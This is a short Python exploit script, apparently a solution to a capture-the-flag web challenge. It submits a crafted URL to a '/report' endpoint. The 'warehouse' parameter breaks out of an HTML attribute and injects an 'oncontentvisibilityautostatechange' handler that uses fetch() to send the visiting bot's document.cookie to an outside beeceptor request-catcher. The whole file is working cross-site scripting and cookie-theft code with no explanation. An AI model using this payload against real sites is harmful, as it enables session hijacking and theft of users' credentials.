import requests
import urllib.parse

BASE_URL = "http://127.0.0.1:5000" # UPDATE THIS
HOOK = urllib.parse.quote_plus("https://6b6fcc5f1869ffc9.free.beeceptor.com/?c=") # UPDATE THIS

def main():
	report_url = f"{BASE_URL}/report"
	payload = f'{BASE_URL}/inventory?warehouse=%22+oncontentvisibilityautostatechange%3dfetch(%22{HOOK}%22%2bdocument.cookie)+style%3d%22content-visibility%3aauto'
	r = requests.post(report_url, data={"url": payload})

if __name__ == '__main__':
	main()
